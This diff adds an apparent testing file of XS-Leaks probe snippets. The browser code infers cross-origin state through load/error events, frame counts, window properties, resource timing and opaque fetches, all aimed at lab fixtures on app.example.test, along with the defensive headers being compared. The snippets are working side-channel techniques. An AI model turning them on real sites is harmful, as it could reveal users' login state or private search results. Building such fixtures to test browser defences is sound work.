@@ -1,0 +1,41 @@
+# XS-Leaks Testing Payloads
+# Independent browser snippets for controlled two-state fixtures. No response-body access is assumed.
+
+const xsImage = new Image(); xsImage.onload = () => console.log('xs-image-load'); xsImage.onerror = () => console.log('xs-image-error'); xsImage.src = 'https://app.example.test/xs-lab/avatar-state';
+<img src="https://app.example.test/xs-lab/avatar-state" onload="console.log('xs-html-load')" onerror="console.log('xs-html-error')">
+
+# Script load/error controls: MIME type, CSP and nosniff can change the result independently of login state
+const xsScript = document.createElement('script'); xsScript.onload = () => console.log('xs-script-load'); xsScript.onerror = () => console.log('xs-script-error'); xsScript.src = 'https://app.example.test/xs-lab/script-state'; document.head.append(xsScript);
+
+# Stylesheet event controls; do not attempt to read cross-origin cssRules
+const xsStyle = document.createElement('link'); xsStyle.rel = 'stylesheet'; xsStyle.onload = () => console.log('xs-style-load'); xsStyle.onerror = () => console.log('xs-style-error'); xsStyle.href = 'https://app.example.test/xs-lab/style-state'; document.head.append(xsStyle);
+
+<iframe id="xs-frame" src="https://app.example.test/xs-lab/frame-state" onload="console.log('xs-frame-loaded')"></iframe>
+<iframe id="xs-frame-redirect" src="https://app.example.test/xs-lab/login-redirect"></iframe>
+
+const xsWindow = window.open('https://app.example.test/xs-lab/frame-count', 'xs-lab-window');
+setTimeout(() => { try { console.log('xs-window-length', xsWindow ? xsWindow.length : 'popup-blocked'); } catch (error) { console.log('xs-window-length-blocked', error.name); } }, 500);
+
+# Window isolation observation; COOP can sever the opener relationship
+setTimeout(() => { try { console.log('xs-window-closed', xsWindow ? xsWindow.closed : 'no-reference'); } catch (error) { console.log('xs-window-closed-blocked', error.name); } }, 750);
+
+performance.clearResourceTimings();
+const xsTimingImage = new Image(); xsTimingImage.src = 'https://app.example.test/xs-lab/timing-image';
+setTimeout(() => console.table(performance.getEntriesByName('https://app.example.test/xs-lab/timing-image').map(entry => ({duration:entry.duration,transferSize:entry.transferSize,encodedBodySize:entry.encodedBodySize}))), 1000);
+
+# Coarse load timing: one sample is a control, never statistical evidence on its own
+const xsStart = performance.now(); const xsTimed = new Image(); xsTimed.onload = xsTimed.onerror = () => console.log('xs-elapsed-ms', performance.now() - xsStart); xsTimed.src = 'https://app.example.test/xs-lab/cache-state';
+
+# Fetch no-cors control: opaque responses cannot reveal status/body and cookie policy still applies
+fetch('https://app.example.test/xs-lab/opaque-state',{mode:'no-cors',credentials:'include'}).then(response => console.log('xs-opaque-control',response.type,response.status));
+
+https://app.example.test/xs-lab/search?query=XS_SYNTHETIC_PRESENT
+https://app.example.test/xs-lab/search?query=XS_SYNTHETIC_ABSENT
+https://app.example.test/xs-lab/redirect-state?fixture=xs-a
+https://app.example.test/xs-lab/redirect-state?fixture=xs-b
+
+# Controlled target response headers; compare the same browser probe across policy variants
+Cross-Origin-Resource-Policy: same-origin
+Cross-Origin-Opener-Policy: same-origin
+Content-Security-Policy: frame-ancestors 'none'
+Cache-Control: private, no-store
